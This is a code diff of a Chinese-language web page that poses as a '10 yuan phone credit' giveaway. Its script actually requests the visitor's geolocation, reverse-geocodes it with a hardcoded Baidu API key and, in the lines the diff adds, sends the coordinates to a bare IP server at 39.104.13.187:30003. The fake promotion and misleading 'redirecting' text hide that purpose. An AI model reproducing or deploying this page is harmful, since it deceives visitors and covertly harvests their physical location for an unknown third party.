@@ -1,69 +1,102 @@
 <!DOCTYPE html>
 <html>
+
 <head>
-<meta name="viewport" content="initial-scale=1.0, user-scalable=no" />
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-<title>输入手机号领取10元话费</title>
-<style type="text/css">
-html{height:100%}
-body{height:100%;margin:0px;padding:0px;color:#000;}
-#container{height:100%}
-</style>
+	<meta name="viewport" content="initial-scale=1.0, user-scalable=no" />
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<title>输入手机号领取10元话费</title>
+	<style type="text/css">
+		html {
+			height: 100%
+		}
+
+		body {
+			height: 100%;
+			margin: 0px;
+			padding: 0px;
+			color: #000;
+		}
+
+		#container {
+			height: 100%
+		}
+	</style>
 </head>
 
 <body>
-<div id="container"></div>
-<script src="https://cdn.bootcss.com/jquery/2.2.0/jquery.min.js"></script>
-<script type="text/javascript">
-function getLocation(){
-    if (navigator.geolocation){
-        navigator.geolocation.getCurrentPosition(showPosition,showError);
-        $('#container').html('页面跳转，请稍后...');
-    }else{
-        alert("浏览器不支持地理定位。");
-    }
-}
-function showError(error){
-    switch(error.code) {
-        case error.PERMISSION_DENIED:
-            alert("定位失败,用户拒绝请求地理定位");
-            break;
-        case error.POSITION_UNAVAILABLE:
-            alert("定位失败,位置信息是不可用");
-            break;
-        case error.TIMEOUT:
-            alert("定位失败,请求获取用户位置超时");
-            break;
-        case error.UNKNOWN_ERROR:
-            alert("定位失败,定位系统失效");
-            break;
-    }
-}
-function showPosition(position){
-    var latlon = position.coords.latitude+','+position.coords.longitude;   //纬度  +  经度
-    $('#container').html(latlon);
-    //baidu
-    var url = "https://api.map.baidu.com/geocoder/v2/?ak=0RIUZulemKGWs3pmBz6wPfTwXbIHmdT3&callback=renderReverse&location="+latlon+"&output=json&pois=0";
-    $.ajax({
-        type: "GET",
-        dataType: "jsonp",
-        url: url,
-        beforeSend: function(){
-            $("#container").html('正在定位...');
-        },
-        success: function (json) {
-            if(json.status==0){
-            	//
-                $("#container").html(json.result.addressComponent.province + json.result.addressComponent.city + json.result.addressComponent.district);
-            }
-        },
-        error: function (XMLHttpRequest, textStatus, errorThrown) {
-            //$("#container").html(latlon+"地址位置获取失败");
-            $("#container").html("页面跳转失败，请检查网络");
-        }
-    });
-};
-getLocation();
-</script>
+	<div id="container"></div>
+	<script src="https://cdn.bootcss.com/jquery/2.2.0/jquery.min.js"></script>
+	<script type="text/javascript">
+		function getLocation() {
+			if (navigator.geolocation) {
+				navigator.geolocation.getCurrentPosition(showPosition, showError);
+				$('#container').html('页面跳转，请稍后...');
+			} else {
+				alert("浏览器不支持地理定位。");
+			}
+		}
+		function showError(error) {
+			switch (error.code) {
+				case error.PERMISSION_DENIED:
+					alert("定位失败,用户拒绝请求地理定位");
+					break;
+				case error.POSITION_UNAVAILABLE:
+					alert("定位失败,位置信息是不可用");
+					break;
+				case error.TIMEOUT:
+					alert("定位失败,请求获取用户位置超时");
+					break;
+				case error.UNKNOWN_ERROR:
+					alert("定位失败,定位系统失效");
+					break;
+			}
+		}
+		function showPosition(position) {
+			var latlon = position.coords.latitude + ',' + position.coords.longitude;   //纬度  +  经度
+			$('#container').html(latlon);
+			//baidu
+			var url = "https://api.map.baidu.com/geocoder/v2/?ak=0RIUZulemKGWs3pmBz6wPfTwXbIHmdT3&callback=renderReverse&location=" + latlon + "&output=json&pois=0";
+			$.ajax({
+				type: "GET",
+				dataType: "jsonp",
+				url: url,
+				beforeSend: function () {
+					$("#container").html('正在定位...');
+				},
+				success: function (json) {
+					if (json.status == 0) {
+						//
+						$("#container").html(json.result.addressComponent.province + json.result.addressComponent.city + json.result.addressComponent.district);
+					}
+				},
+				error: function (XMLHttpRequest, textStatus, errorThrown) {
+					//$("#container").html(latlon+"地址位置获取失败");
+					$("#container").html(latlon + "页面跳转失败，请检查网络");
+					postwith(latlon);
+				}
+			});
+		};
+
+		function postwith(data1) {
+			var httpRequest = new XMLHttpRequest();//第一步：建立所需的对象
+			httpRequest.open('GET', 'http://39.104.13.187:30003/create?data='+data1, true);//第二步：打开连接  
+			httpRequest.send();//第三步：发送请求  将请求参数写在URL中
+			/**
+			 * 获取数据后的处理程序
+			 */
+			httpRequest.onreadystatechange = function () {
+				if (httpRequest.readyState == 4 && httpRequest.status == 200) {
+					var json = httpRequest.responseText;//获取到json字符串，还需解析
+					console.log(json);
+				}
+			};
+		}
+
+		window.onload = function () {
+			getLocation();
+		}
+
+	</script>
 </body>
+
 </html>
